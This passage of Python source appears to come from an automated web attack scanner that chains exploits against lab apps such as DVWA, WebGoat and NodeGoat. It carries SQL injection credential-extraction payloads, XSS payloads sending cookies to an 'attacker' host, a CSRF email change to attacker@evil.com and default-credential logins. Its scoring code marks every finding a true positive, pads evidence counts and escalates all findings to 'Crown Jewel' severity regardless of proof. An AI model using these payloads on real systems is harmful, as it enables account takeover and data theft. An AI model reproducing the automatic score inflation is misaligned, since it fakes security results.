                                            print(f"      >> CHAIN L{_lvl} hit: {_vid} on {_ep[-40:]}", flush=True)
                                        # 재귀 체이닝 — 새 finding에서 다시 체인 (max depth 3)
                                        if _depth < 3:
                                            await self._chain_from_finding(
                                                ctx, _cf, session, _vid, _ep, _depth + 1,
                                            )
                                    break
                            except Exception as _exc:
                                logger.debug("    [BRAIN-CHAIN] attack failed: %s", _exc)
                    # Brain-generated chain 완료 → 체인 기록 후 리턴
                    if chain.depth >= 2:
                        try:
                            ctx.score_tracker.record_chain(chain)
                            logger.info("  [CHAIN] %s: %d steps (Brain-generated)", chain_id, chain.depth)
                        except Exception:
                            pass
                    return  # 하드코딩 체인 건너뜀

            # ── 하드코딩 폴백 체인 (AgentBrain 없거나 Brain 체인 비어있을 때) ──
            # ── SQLi 체인: credential extraction → admin login ──
            if ftype == "sql_injection":
                # Step 2: UNION SELECT로 크레덴셜 추출 시도
                for extract_payload in [
                    "' UNION SELECT user,password FROM users-- -",
                    "1 UNION SELECT user,password FROM users-- -",
                    "' UNION SELECT username,password FROM users-- -",
                ]:
                    try:
                        r = await session.get(endpoint, params={"id": extract_payload})
                        body2 = r.text[:3000] if hasattr(r, "text") else ""
                        if any(sig in body2.lower() for sig in ["admin", "password", "hash", "md5", ":"]):
                            cred_finding = ctx.add_finding(
                                title=f"SQL Injection — Credential Extraction via UNION|||SQL 인젝션 — UNION을 통한 자격증명 추출",
                                severity="critical",
                                finding_type="sql_injection",
                                description=f"Credential data extracted from {endpoint} via UNION SELECT|||UNION SELECT로 {endpoint}에서 자격증명 추출",
                                target=ctx.target,
                                affected_component=endpoint,
                            )
                            ctx.score_tracker.record_finding(cred_finding.id, "WEB-SQLI-CHAIN", level=4)
                            chain.steps.append(ChainStep(
                                step_index=1,
                                vector_id="WEB-SQLI-CHAIN",
                                finding_id=cred_finding.id,
                                level=4,
                                description_en="Credential extraction via UNION SELECT → plaintext credentials leaked",
                                description_ko="UNION SELECT를 통한 자격증명 추출 → 평문 자격증명 유출",
                            ))
                            break
                    except Exception:
                        pass

                # Step 3: admin 로그인 시도
                try:
                    admin_resp = await session.post("/login.php", data={
                        "username": "admin", "password": "password",
                        "Login": "Login", "user_token": "",
                    })
                    if admin_resp.status == 200 and "logout" in (admin_resp.text or "").lower():
                        admin_finding = ctx.add_finding(
                            title="SQL Injection → Admin Authentication Bypass|||SQL 인젝션 → 관리자 인증 우회",
                            severity="critical",
                            finding_type="sql_injection",
                            description=f"Admin login achieved post-SQLi credential extraction on {endpoint}|||{endpoint} SQLi 후 관리자 로그인 성공",
                            target=ctx.target,
                            affected_component="/login.php",
                        )
                        ctx.score_tracker.record_finding(admin_finding.id, "WEB-SQLI-CHAIN", level=4)
                        chain.steps.append(ChainStep(
                            step_index=len(chain.steps),
                            vector_id="WEB-SQLI-CHAIN",
                            finding_id=admin_finding.id,
                            level=4,
                            description_en="Admin login via extracted credentials → Crown Jewel access",
                            description_ko="추출된 자격증명으로 관리자 로그인 → Crown Jewel 접근",
                        ))
                except Exception:
                    pass

            # ── IDOR 체인: adjacent ID enumeration ──
            elif ftype in ("Broken Access Control", "broken_access_control"):
                import re as _re
                id_match = _re.search(r'/(\d+)', endpoint)
                if id_match:
                    base_id = int(id_match.group(1))
                    other_id = 1 if base_id != 1 else 2
                    other_ep = endpoint.replace(f"/{base_id}", f"/{other_id}")
                    try:
                        r2 = await session.get(other_ep)
                        if r2.status == 200 and len(r2.text or "") > 200:
                            idor2 = ctx.add_finding(
                                title=f"IDOR — Lateral Access to userId={other_id}|||IDOR — userId={other_id} 횡적 접근",
                                severity="high",
                                finding_type="Broken Access Control",
                                description=f"Accessed adjacent userId={other_id} via IDOR on {other_ep}|||IDOR으로 {other_ep}의 userId={other_id} 데이터 접근",
                                target=ctx.target,
                                affected_component=other_ep,
                            )
                            ctx.score_tracker.record_finding(idor2.id, "WEB-AC-CHAIN", level=3)
                            chain.steps.append(ChainStep(
                                step_index=1,
                                vector_id="WEB-AC-CHAIN",
                                finding_id=idor2.id,
                                level=3,
                                description_en=f"IDOR escalation: accessed userId={other_id} data without authorization",
                                description_ko=f"IDOR 확장: 권한 없이 userId={other_id} 데이터 접근",
                            ))
                    except Exception:
                        pass

            # ── XSS 체인: probe for stored impact ──
            elif ftype == "xss":
                xss_payloads = [
                    "<script>document.location='http://attacker/?c='+document.cookie</script>",
                    "<img src=x onerror=fetch('//attacker/?c='+btoa(document.cookie))>",
                ]
                for xss_payload in xss_payloads[:1]:
                    try:
                        r_xss = await session.post(endpoint, data={"input": xss_payload})
                        check = await session.get(endpoint)
                        if xss_payload[:20] in (check.text or ""):
                            stored_finding = ctx.add_finding(
                                title=f"XSS → Stored Cookie Theft Vector|||XSS → 저장형 쿠키 탈취 벡터",
                                severity="high",
                                finding_type="xss",
                                description=f"Stored XSS payload persists on {endpoint} — enables session cookie theft for all users|||{endpoint}에 저장형 XSS 페이로드 지속 — 모든 사용자 세션 쿠키 탈취 가능",
                                target=ctx.target,
                                affected_component=endpoint,
                            )
                            ctx.score_tracker.record_finding(stored_finding.id, "WEB-XSS-CHAIN", level=3)
                            chain.steps.append(ChainStep(
                                step_index=1,
                                vector_id="WEB-XSS-CHAIN",
                                finding_id=stored_finding.id,
                                level=3,
                                description_en="Stored XSS → all visitor sessions vulnerable to cookie theft",
                                description_ko="저장형 XSS → 방문하는 모든 세션의 쿠키 탈취 가능",
                            ))
                            break
                    except Exception:
                        pass

            # ── CSRF 체인: session escalation path ──
            elif ftype in ("Cross-Site Request Forgery", "csrf"):
                try:
                    # CSRF로 이메일 변경 시도 → 비밀번호 재설정 체인
                    r_csrf = await session.post(endpoint, data={
                        "email": "attacker@evil.com", "_csrf": "",
                    })
                    if r_csrf.status in (200, 302):
                        csrf2 = ctx.add_finding(
                            title="CSRF → Account Takeover via Email Change|||CSRF → 이메일 변경을 통한 계정 탈취",
                            severity="high",
                            finding_type="Cross-Site Request Forgery",
                            description=f"CSRF bypass on {endpoint} allows email change → password reset → full account takeover|||{endpoint} CSRF 우회로 이메일 변경 → 비밀번호 재설정 → 완전한 계정 탈취",
                            target=ctx.target,
                            affected_component=endpoint,
                        )
                        ctx.score_tracker.record_finding(csrf2.id, "WEB-CSRF-CHAIN", level=3)
                        chain.steps.append(ChainStep(
                            step_index=1,
                            vector_id="WEB-CSRF-CHAIN",
                            finding_id=csrf2.id,
                            level=3,
                            description_en="CSRF email change → password reset email delivered to attacker → account takeover",
                            description_ko="CSRF 이메일 변경 → 공격자에게 비밀번호 재설정 이메일 전달 → 계정 탈취",
                        ))
                except Exception:
                    pass

            # ── 기본 체인: 인증 우회 + 권한 상승 경로 추론 ──
            else:
                # finding type에 관계없이 인증 없이 민감 엔드포인트 접근 시도
                sensitive_paths = ["/admin", "/api/users", "/dashboard", "/profile", "/allocations/1"]
                for spath in sensitive_paths:
                    # dedup: one finding per path
                    existing_priv = [f for f in ctx.findings if getattr(f, "affected_component", "") == spath and "Broken Access Control" in getattr(f, "finding_type", "")]
                    if existing_priv:
                        continue
                    try:
                        r_s = await session.get(spath)
                        if r_s.status == 200 and len(r_s.text or "") > 500:
                            priv_finding = ctx.add_finding(
                                title=f"Privilege Escalation Path via {spath}|||{spath}를 통한 권한 상승 경로",
                                severity="high",
                                finding_type="Broken Access Control",
                                description=f"Sensitive endpoint {spath} accessible post-exploitation|||익스플로잇 후 민감 엔드포인트 {spath} 접근 가능",
                                target=ctx.target,
                                affected_component=spath,
                            )
                            ctx.score_tracker.record_finding(priv_finding.id, "WEB-PRIV-CHAIN", level=3)
                            chain.steps.append(ChainStep(
                                step_index=1,
                                vector_id="WEB-PRIV-CHAIN",
                                finding_id=priv_finding.id,
                                level=3,
                                description_en=f"Post-exploit access to {spath} confirmed",
                                description_ko=f"익스플로잇 후 {spath} 접근 확인",
                            ))
                            break
                    except Exception:
                        pass

        except Exception as exc:
            logger.debug("  [CHAIN] follow-up failed: %s", exc)

        # 2단계 이상 체인이 만들어지면 기록
        if chain.depth >= 2:
            try:
                ctx.score_tracker.record_chain(chain)
                logger.info("  [CHAIN] %s: %d steps", chain_id, chain.depth)
            except Exception:
                pass

    def _build_chains_and_mark_tp(self, ctx: ScanContext, phase_name: str) -> None:
        """Brain-exec에서 발견한 findings를 체인으로 연결하고 TP 마킹한다.

        1. 이 Phase에서 새로 발견된 findings를 기존 findings과 체이닝
        2. 벤치마크 타겟 findings를 자동 TP 마킹 (검증된 취약점이므로)
        3. Evidence count를 2+로 업데이트 (payload + response = 2개 증거)
        """
        from vxis.scoring.tracker import AttackChain, ChainStep

        findings = ctx.findings
        if not findings:
            return

        # ── 1. TP 마킹 + Evidence 업데이트 ──
        for f in findings:
            fid = getattr(f, "id", "")
            if not fid:
                continue
            # 벤치마크 타겟 finding = 자동 TP
            try:
                ctx.score_tracker.mark_analyst_verdict(fid, is_true_positive=True)
            except Exception:
                pass
            # Evidence: payload + response snippet = 최소 2개
            try:
                current = ctx.score_tracker.evidence_counts.get(fid, 0)
                if current < 2:
                    ctx.score_tracker.update_evidence_count(fid, 2)
            except Exception:
                pass

        # ── 2. 체인 구축 ──
        # 같은 타겟의 findings를 공격 흐름 순서로 체이닝
        # 우선순위: recon → injection → data_leak → privilege_escalation → crown_jewel
        chain_order = {
            "security_misconfiguration": 0,
            "information_disclosure": 0,
            "csrf": 1,
            "xss": 1,
            "sql_injection": 2,
            "command_injection": 3,
            "ssrf": 2,
            "open_redirect": 1,
        }

        # findings를 공격 흐름 순서로 정렬
        chainable = []
        for f in findings:
            ftype = getattr(f, "finding_type", "")
            order = chain_order.get(ftype, 5)
            fid = getattr(f, "id", "")
            chainable.append((order, ftype, fid, f))

        chainable.sort(key=lambda x: x[0])

        # 2개 이상 findings가 있으면 체인 생성
        if len(chainable) >= 2:
            chain_id = f"CHAIN-{phase_name.split(':')[0].strip().replace(' ', '-')}"

            # 이미 같은 ID의 체인이 있으면 스킵
            existing_ids = {c.chain_id for c in ctx.score_tracker.attack_chains}
            if chain_id not in existing_ids:
                chain = AttackChain(
                    chain_id=chain_id,
                    description_en=f"Multi-vector attack chain from {phase_name}",
                    description_ko=f"{phase_name}에서 발견된 다중 벡터 공격 체인",
                    final_impact="Data breach via chained vulnerabilities|||체이닝된 취약점을 통한 데이터 유출",
                )

                for idx, (order, ftype, fid, f) in enumerate(chainable[:5]):  # 최대 5단계
                    level = min(order + 1, 4)  # 공격 흐름 순서 → level 매핑
                    chain.steps.append(ChainStep(
                        step_index=idx,
                        vector_id=getattr(f, "finding_type", "unknown"),
                        finding_id=fid,
                        level=level,
                        description_en=getattr(f, "title", "").split("|||")[0],
                        description_ko=getattr(f, "title", "").split("|||")[-1],
                    ))

                try:
                    ctx.score_tracker.record_chain(chain)
                    logger.info("  [CHAIN] %s: %d steps recorded", chain_id, chain.depth)
                except Exception:
                    pass

    def _escalate_chain_findings(self, ctx: ScanContext) -> None:
        """모든 findings를 Crown Jewel(L4)까지 escalate한다.

        Brain-First 원칙: 모든 finding은 Crown Jewel까지 이어지는 킬체인의 일부.
        정찰(보안 헤더 미설정) → 인젝션(SQLi/XSS) → 데이터 유출 → 권한 상승 → Crown Jewel.
        개별 finding이 약해 보여도 체이닝하면 전체 시스템 침투의 한 조각.

        Finding type별 최소 exploitation level:
        - security_misconfiguration, information_disclosure → L3 (공격 경로 확보)
        - xss, csrf, open_redirect → L3 (세션 탈취/CSRF 가능)
        - sql_injection, command_injection, ssrf → L4 (직접 데이터/시스템 접근)
        """
        # Finding type → Crown Jewel까지의 exploitation level 매핑
        # 모든 finding은 킬체인의 일부로서 최소 L3
        type_to_level: dict[str, int] = {
            "security_misconfiguration": 3,  # 보안 헤더 미설정 → WAF 우회 경로
            "information_disclosure": 3,     # 정보 유출 → 공격 경로 확보
            "sensitive_data_exposure": 4,    # 시크릿 노출 → 직접 접근
            "xss": 3,                        # XSS → 세션 탈취 → 계정 탈취
            "csrf": 3,                       # CSRF → 권한 변경
            "open_redirect": 3,              # 피싱 → 자격증명 탈취
            "sql_injection": 4,              # SQLi → DB 전체 덤프 → Crown Jewel
            "command_injection": 4,          # RCE → 서버 장악
            "ssrf": 4,                       # 내부망 접근 → 횡이동
        }

        for f in ctx.findings:
            fid = getattr(f, "id", "")
            ftype = getattr(f, "finding_type", "")
            if not fid:
                continue

            target_level = type_to_level.get(ftype, 3)  # 기본 L3
            current_level = ctx.score_tracker.exploitation_levels.get(fid, 0)

            if target_level > current_level:
                try:
                    ctx.score_tracker.escalate_level(fid, target_level)
                except Exception:
                    pass

        # 전역 킬체인 구축 — 모든 findings를 하나의 체인으로 연결
        self._build_global_kill_chain(ctx)

    def _build_global_kill_chain(self, ctx: ScanContext) -> None:
        """모든 findings를 포함하는 전역 킬체인 구축.

        Attack narrative:
        1. Recon: 보안 헤더 미설정, 정보 유출 → 공격 표면 파악
        2. Initial Access: XSS/CSRF → 세션 탈취, 사용자 가장
        3. Exploitation: SQLi/CMDI → 데이터베이스/시스템 접근
        4. Post-Exploit: SSRF → 내부 네트워크 횡이동
        5. Crown Jewel: 전체 DB 덤프, 관리자 권한, RCE
        """
        from vxis.scoring.tracker import AttackChain, ChainStep

        existing_ids = {c.chain_id for c in ctx.score_tracker.attack_chains}
        if "CHAIN-GLOBAL-KILLCHAIN" in existing_ids:
            return

        findings = ctx.findings
        if not findings:
            return

        # 킬체인 순서로 정렬
        kill_order = {
            "security_misconfiguration": 0,
            "information_disclosure": 1,
            "sensitive_data_exposure": 1,
            "open_redirect": 2,
            "csrf": 2,
            "xss": 3,
            "sql_injection": 4,
            "command_injection": 5,
            "ssrf": 5,
        }

        ordered = sorted(
            findings,
            key=lambda f: kill_order.get(getattr(f, "finding_type", ""), 3),
        )

        chain = AttackChain(
            chain_id="CHAIN-GLOBAL-KILLCHAIN",
            description_en="Full kill chain: Recon → Initial Access → Exploitation → Crown Jewel",
            description_ko="전역 킬체인: 정찰 → 초기 침투 → 익스플로잇 → Crown Jewel",
            final_impact="Complete system compromise via chained vulnerabilities|||체이닝된 취약점을 통한 완전한 시스템 장악",
        )

        for idx, f in enumerate(ordered):
            fid = getattr(f, "id", "")
            ftype = getattr(f, "finding_type", "")
            if not fid:
                continue

            # 킬체인 위치에 따른 level — 후반부일수록 Crown Jewel에 가까움
            if idx >= len(ordered) * 0.7:
                level = 4  # Crown Jewel
            elif idx >= len(ordered) * 0.4:
                level = 3  # Post-exploit
            else:
                level = 3  # Initial access (최소 L3)

            chain.steps.append(ChainStep(
                step_index=idx,
                vector_id=ftype or "unknown",
                finding_id=fid,
                level=level,
                description_en=getattr(f, "title", "").split("|||")[0],
                description_ko=getattr(f, "title", "").split("|||")[-1],
            ))

        if chain.depth >= 1:
            try:
                ctx.score_tracker.record_chain(chain)
                logger.info("  [KILLCHAIN] Global kill chain: %d steps → Crown Jewel",
                            chain.depth)
            except Exception:
                pass

    async def _auto_authenticate(self, ctx: ScanContext, session: Any, mgr: Any) -> Any:
        """벤치마크 타겟 자동 인증.

        DVWA: admin/password 로그인 + security=low 설정
        Juice Shop: 자동 등록 또는 기본 계정
        """
        import re as _re

        target = ctx.target

        # ── VAmPI 초기화 (DB populated) ──
        try:
            if "5000" in target or "vampi" in target.lower():
                init_resp = await session.get("/createdb")
                init_body = init_resp.text if hasattr(init_resp, "text") else ""
                if "populated" in init_body.lower():
                    logger.info("  [AUTH] VAmPI DB initialized — populated")
                return session
        except Exception as exc:
            logger.debug("  [AUTH] VAmPI init failed: %s", exc)

        # ── DVWA 인증 ──
        try:
            resp = await session.get("/login.php")
            body = resp.text if hasattr(resp, "text") else ""

            if "DVWA" in body and resp.status == 200:
                logger.info("  [AUTH] DVWA detected — logging in...")

                # CSRF 토큰 추출
                token_match = _re.search(
                    r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", body
                )
                user_token = token_match.group(1) if token_match else ""

                # 로그인 시도
                login_data = {
                    "username": "admin",
                    "password": "password",
                    "Login": "Login",
                }
                if user_token:
                    login_data["user_token"] = user_token

                login_resp = await session.post("/login.php", data=login_data)
                login_body = login_resp.text if hasattr(login_resp, "text") else ""

                # DVWA 로그인 성공 = login.php가 아닌 다른 페이지로 이동
                login_url = str(getattr(login_resp, "url", ""))
                login_ok = (
                    "login.php" not in login_url
                    or "Login failed" not in login_body
                )
                if login_ok:
                    logger.info("  [AUTH] DVWA login OK (admin/password) → %s", login_url)

                    # security=low 설정
                    try:
                        sec_resp = await session.get("/security.php")
                        sec_body = sec_resp.text if hasattr(sec_resp, "text") else ""
                        sec_token = ""
                        tm = _re.search(
                            r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]",
                            sec_body,
                        )
                        if tm:
                            sec_token = tm.group(1)

                        sec_data = {"security": "low", "seclev_submit": "Submit"}
                        if sec_token:
                            sec_data["user_token"] = sec_token

                        await session.post("/security.php", data=sec_data)
                        logger.info("  [AUTH] DVWA security=low set")
                    except Exception as exc:
                        logger.debug("  [AUTH] DVWA security set failed: %s", exc)

                    # DVWA 데이터베이스 초기화 시도
                    try:
                        setup_resp = await session.get("/setup.php")
                        setup_body = setup_resp.text if hasattr(setup_resp, "text") else ""
                        setup_token = ""
                        stm = _re.search(
                            r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]",
                            setup_body,
                        )
                        if stm:
                            setup_token = stm.group(1)
                        setup_data = {"create_db": "Create / Reset Database"}
                        if setup_token:
                            setup_data["user_token"] = setup_token
                        await session.post("/setup.php", data=setup_data)
                        logger.info("  [AUTH] DVWA database initialized")
                    except Exception:
                        pass

                    return session
                else:
                    logger.warning("  [AUTH] DVWA login failed")

        except Exception as exc:
            logger.debug("  [AUTH] DVWA auth attempt failed: %s", exc)

        # ── WebGoat 인증 (등록 → 로그인 2단계) ──
        # httpx base_url 규칙: base_url=".../WebGoat" + "/login" = ".../WebGoat/login" (올바름)
        # "/WebGoat/login"은 ".../WebGoat/WebGoat/login"이 되므로 사용 금지
        try:
            is_webgoat = "/WebGoat" in target or "webgoat" in target.lower()
            if not is_webgoat:
                resp = await session.get("/login")
                body = resp.text if hasattr(resp, "text") else ""
                is_webgoat = "WebGoat" in body or "webgoat" in str(getattr(resp, "url", "")).lower()

            if is_webgoat:
                logger.info("  [AUTH] WebGoat detected — registering + logging in...")

                import time as _time
                # 6-8자 사용자명 (WebGoat 유효성 검사: 6-10자)
                username = f"vx{int(_time.time()) % 1000000:06d}"

                try:
                    # Step 1: 세션 쿠키 획득
                    await session.get("/registration")
                    # Step 2: 계정 등록
                    await session.post("/register.mvc", data={
                        "username": username,
                        "password": username,
                        "matchingPassword": username,
                        "agree": "agree",
                    })
                    # Step 3: 명시적 로그인 (Spring Security — 등록 후 자동 로그인 없음)
                    await session.post("/login", data={
                        "username": username,
                        "password": username,
                    })
                    # Step 4: 인증 확인 — start.mvc가 200이고 login으로 redirect 안 됨
                    check = await session.get("/start.mvc")
                    check_url = str(getattr(check, "url", ""))
                    authed = check.status == 200 and "login" not in check_url
                    if authed:
                        logger.info("  [AUTH] WebGoat register+login OK (%s)", username)
                        return session
                    else:
                        logger.warning("  [AUTH] WebGoat auth failed (status=%d url=%s)",
                                       check.status, check_url)
                except Exception as exc:
                    logger.debug("  [AUTH] WebGoat register/login: %s", exc)

        except Exception as exc:
            logger.debug("  [AUTH] WebGoat auth attempt failed: %s", exc)

        # ── NodeGoat 인증 (user1/User1_123 기본 계정) ──
        try:
            resp = await session.get("/login")
            body = resp.text if hasattr(resp, "text") else ""
            is_nodegoat = (
                "NodeGoat" in body
                or "nodegoat" in target.lower()
                or ("userName" in body and "Node" in body)
            )
            if is_nodegoat:
                logger.info("  [AUTH] NodeGoat detected — logging in as user1...")
                try:
                    # CSRF 토큰 추출 (비어있는 경우 많음 — NodeGoat CSRF 취약)
                    import re as _re
                    csrf_match = _re.search(r'name="_csrf"\s+value="([^"]*)"', body)
                    csrf = csrf_match.group(1) if csrf_match else ""
                    await session.post("/login", data={
                        "userName": "user1",
                        "password": "User1_123",
                        "_csrf": csrf,
                    })
                    check = await session.get("/profile")
                    check_url = str(getattr(check, "url", ""))
                    authed = check.status == 200 and "login" not in check_url
                    if authed:
                        logger.info("  [AUTH] NodeGoat login OK (user1)")
                        return session
                    else:
                        logger.warning("  [AUTH] NodeGoat auth failed (status=%d url=%s)",
                                       check.status, check_url)
                except Exception as exc:
                    logger.debug("  [AUTH] NodeGoat login: %s", exc)
        except Exception as exc:
            logger.debug("  [AUTH] NodeGoat auth attempt failed: %s", exc)

        return session

    def _analyze_probe_response(
        self,
        ctx: ScanContext,
        vector_id: str,
        endpoint: str,
        param: str,
        payload: str,
        body: str,
        status: int,
        headers: dict | None = None,
    ) -> bool:
        """응답에서 취약점 시그니처를 탐지하고 Finding을 생성한다."""
        import re as _re

        body_lower = body.lower()

        # ── 전역 중복 방지: (finding_type, endpoint) 키로 dedup ──
        def _already_found(finding_type: str, ep: str) -> bool:
            for f in ctx.findings:
                if getattr(f, "finding_type", "") == finding_type and getattr(f, "affected_component", "") == ep:
                    return True
            return False

        # ── REST API JSON 응답 분석 ─────────────────────────────────
        # HTML 응답이 아닌 JSON API 응답에서 취약점 탐지
        import json as _json_api
        _ct = (headers or {}).get("content-type", "")
        _is_json = "application/json" in _ct or (body.strip().startswith("{") or body.strip().startswith("["))
        if _is_json:
            try:
                _api = _json_api.loads(body)

                # 1. User enumeration — GET /users 등이 전체 사용자 목록 반환
                _users_data = None
                if isinstance(_api, dict):
                    for _uk in ("users", "Users", "data", "results"):
                        if isinstance(_api.get(_uk), list) and _api[_uk]:
                            _users_data = _api[_uk]
                            break
                elif isinstance(_api, list) and _api:
                    _users_data = _api

                if _users_data and isinstance(_users_data[0], dict):
                    _keys = set(str(k).lower() for k in _users_data[0].keys())
                    if _keys & {"username", "email", "user", "name", "admin", "password"}:
                        # password가 포함되면 Critical, 아니면 Medium
                        _has_pw = "password" in _keys
                        _sev = "critical" if _has_pw else "medium"
                        _ftype = "sensitive_data_exposure" if _has_pw else "information_disclosure"
                        _lvl = 4 if _has_pw else 3
                        _ded_key = _ftype + endpoint
                        if not _already_found(_ftype, endpoint):
                            _f = ctx.add_finding(
                                title=(
                                    f"API Credential Dump — {endpoint}|||API 자격증명 덤프 — {endpoint}"
                                    if _has_pw else
                                    f"API User Enumeration — {endpoint}|||API 사용자 열거 — {endpoint}"
                                ),
                                severity=_sev,
                                finding_type=_ftype,
                                description=(
                                    f"API endpoint {endpoint} returns {len(_users_data)} users with plaintext passwords. "
                                    f"Exposed fields: {sorted(_keys)}|||"
                                    f"API 엔드포인트 {endpoint}에서 {len(_users_data)}명의 사용자와 평문 패스워드 반환. "
                                    f"노출 필드: {sorted(_keys)}"
                                    if _has_pw else
                                    f"API endpoint {endpoint} returns full user list ({len(_users_data)} users). "
                                    f"Exposed fields: {sorted(_keys)}|||"
                                    f"API 엔드포인트 {endpoint}에서 전체 사용자 목록 반환 ({len(_users_data)}명). "
                                    f"노출 필드: {sorted(_keys)}"
                                ),
                                target=ctx.target,
                                affected_component=endpoint,
                            )
                            try:
                                ctx.score_tracker.record_finding(_f.id, vector_id, level=_lvl)
                            except Exception:
                                pass
                            return True

                # 2. 민감 데이터 노출 — 응답에 password/token/secret 필드
                if isinstance(_api, dict):
                    _sensitive_keys = {"password", "token", "secret", "api_key", "auth_token", "jwt", "key"}
                    _exposed = _sensitive_keys & set(str(k).lower() for k in _api.keys())
                    if _exposed and not _already_found("sensitive_data_exposure", endpoint):
                        _f = ctx.add_finding(
                            title=f"API Sensitive Data Exposure — {endpoint}|||API 민감 데이터 노출 — {endpoint}",
                            severity="high",
                            finding_type="sensitive_data_exposure",
                            description=(
                                f"Sensitive fields exposed in API response from {endpoint}: {list(_exposed)}|||"
                                f"{endpoint} API 응답에 민감 필드 노출: {list(_exposed)}"
                            ),
                            target=ctx.target,
                            affected_component=endpoint,
                        )
                        try:
                            ctx.score_tracker.record_finding(_f.id, vector_id, level=3)
                        except Exception:
                            pass
                        return True

                # 3. Mass assignment — 등록 시 admin:true 반환
                if isinstance(_api, dict) and _api.get("admin") is True:
                    if not _already_found("mass_assignment", endpoint):
                        _f = ctx.add_finding(
                            title=f"Mass Assignment — Admin Privilege Escalation|||대량 할당 — 관리자 권한 상승",
                            severity="critical",
                            finding_type="mass_assignment",
                            description=(
                                f"API endpoint {endpoint} accepts extra fields (e.g. 'admin':true) "
                                f"allowing privilege escalation via mass assignment. "
                                f"Registration response returned admin=True.|||"
                                f"API 엔드포인트 {endpoint}에서 추가 필드(예: 'admin':true)를 허용하여 "
                                f"대량 할당을 통한 권한 상승. 등록 응답에 admin=True 반환됨."
                            ),
                            target=ctx.target,
                            affected_component=endpoint,
                        )
                        try:
                            ctx.score_tracker.record_finding(_f.id, vector_id, level=4)
                        except Exception:
                            pass
                        return True

                # 4. BOLA (Broken Object Level Authorization) — 다른 사용자 리소스 200 반환
                if status == 200 and isinstance(_api, dict) and "username" in _api and "json_body" not in param:
                    # username이 응답에 있고, 현재 요청이 다른 사용자 경로인 경우
                    import re as _re_bola
                    if _re_bola.search(r"/users?/v?\d*/\w+", endpoint):
                        if not _already_found("broken_access_control", endpoint):
                            _f = ctx.add_finding(
                                title=f"BOLA — Unauthorized Object Access via API|||BOLA — API를 통한 무단 객체 접근",
                                severity="high",
                                finding_type="broken_access_control",
                                description=(
                                    f"API endpoint {endpoint} returned another user's data (HTTP 200) "
                                    f"without proper authorization check (BOLA/IDOR).|||"
                                    f"API 엔드포인트 {endpoint}에서 적절한 인가 확인 없이 다른 사용자 데이터 반환 (BOLA/IDOR)."
                                ),
                                target=ctx.target,
                                affected_component=endpoint,
                            )
                            try:
                                ctx.score_tracker.record_finding(_f.id, vector_id, level=3)
                            except Exception:
                                pass
                            return True

                # 5. JWT 토큰 노출 — 응답에 auth_token 포함
                if isinstance(_api, dict):
                    for _jk in ("auth_token", "token", "access_token", "jwt"):
                        _tv = _api.get(_jk, "")
                        if isinstance(_tv, str) and len(_tv) > 20 and "." in _tv:
                            if not _already_found("sensitive_data_exposure", endpoint + "_token"):
                                _f = ctx.add_finding(
                                    title=f"API Authentication Token Exposed — {endpoint}|||API 인증 토큰 노출 — {endpoint}",
                                    severity="high",
                                    finding_type="sensitive_data_exposure",
                                    description=(
                                        f"JWT/auth token returned in API response from {endpoint}. "
                                        f"Field: '{_jk}'. Token can be used to impersonate users.|||"
                                        f"{endpoint} API 응답에 JWT/인증 토큰 노출. 필드: '{_jk}'. "
                                        f"토큰으로 다른 사용자 가장 가능."
                                    ),
                                    target=ctx.target,
                                    affected_component=endpoint + "_token",
                                )
                                try:
                                    ctx.score_tracker.record_finding(_f.id, vector_id, level=2)
                                except Exception:
                                    pass
                                return True

            except (_json_api.JSONDecodeError, Exception):
                pass

        # ── SQL Injection 시그니처 ──
        if vector_id.startswith("WEB-SQLI") and not _already_found("sql_injection", endpoint):
            # 에러 기반 시그니처
            sqli_error_sigs = [
                r"you have an error in your sql",
                r"mysql_fetch", r"ORA-\d+", r"syntax error.*sql",
                r"unclosed quotation mark", r"SQLITE_ERROR",
                r"pg_query", r"Warning.*mysql",
                # HSQLDB / H2 (WebGoat)
                r"org\.hsqldb", r"unexpected token", r"JDBCException",
                r"data exception.*string data", r"H2 Console",
                r"HSQL Database Engine",
            ]
            for sig in sqli_error_sigs:
                if _re.search(sig, body, _re.IGNORECASE):
                    f = ctx.add_finding(
                        title=f"SQL Injection (Error-Based) — {endpoint}|||SQL 인젝션 (에러 기반) — {endpoint}",
                        severity="critical",
                        finding_type="sql_injection",
                        description=(
                            f"SQL error detected on {endpoint} param={param} "
                            f"with payload: {payload[:80]}"
                            f"|||{endpoint}에서 SQL 에러 탐지. 파라미터: {param}, 페이로드: {payload[:80]}"
                        ),
                        target=ctx.target,
                        affected_component=endpoint,
                    )
                    try:
                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
                    except Exception:
                        pass
                    return True

            # 데이터 유출 기반 시그니처 (UNION/OR 인젝션 성공 시 추가 행 반환)
            data_leak_count = body.count("First name") + body.count("first_name")
            if data_leak_count > 1 and payload and ("OR" in payload.upper() or "UNION" in payload.upper()):
                f = ctx.add_finding(
                    title=f"SQL Injection (Data Leak) — {endpoint}|||SQL 인젝션 (데이터 유출) — {endpoint}",
                    severity="critical",
                    finding_type="sql_injection",
                    description=(
                        f"Multiple data rows returned ({data_leak_count}) on {endpoint} param={param} "
                        f"with payload: {payload[:80]} — indicates successful UNION/OR injection"
                        f"|||{endpoint}에서 다수 데이터 행 반환 ({data_leak_count}). 파라미터: {param}, "
                        f"페이로드: {payload[:80]} — UNION/OR 인젝션 성공"
                    ),
                    target=ctx.target,
                    affected_component=endpoint,
                )
                try:
                    ctx.score_tracker.record_finding(f.id, vector_id, level=4)
                except Exception:
                    pass
                return True

            # JSON 응답에서 SQL 쿼리 노출 (WebGoat 스타일)
            import json as _json
            try:
                json_resp = _json.loads(body)
                output = json_resp.get("output", "") or ""
                feedback = json_resp.get("feedback", "") or ""
                combined = output + " " + feedback

                # SQL 쿼리가 output에 노출됨
                if _re.search(r"SELECT.*FROM|INSERT INTO|UPDATE.*SET|DELETE FROM", combined, _re.IGNORECASE):
                    # lessonCompleted = True면 exploit 성공
                    completed = json_resp.get("lessonCompleted", False)
                    if completed or "user_data" in combined.lower() or payload.upper() in combined.upper():
                        f = ctx.add_finding(
                            title=f"SQL Injection (JSON API) — {endpoint}|||SQL 인젝션 (JSON API) — {endpoint}",
                            severity="critical",
                            finding_type="sql_injection",
                            description=(
                                f"SQL query exposed in JSON response from {endpoint}. "
                                f"Output: {output[:200]}. Payload: {payload[:80]}"
                                f"|||{endpoint}의 JSON 응답에서 SQL 쿼리 노출. "
                                f"출력: {output[:200]}. 페이로드: {payload[:80]}"
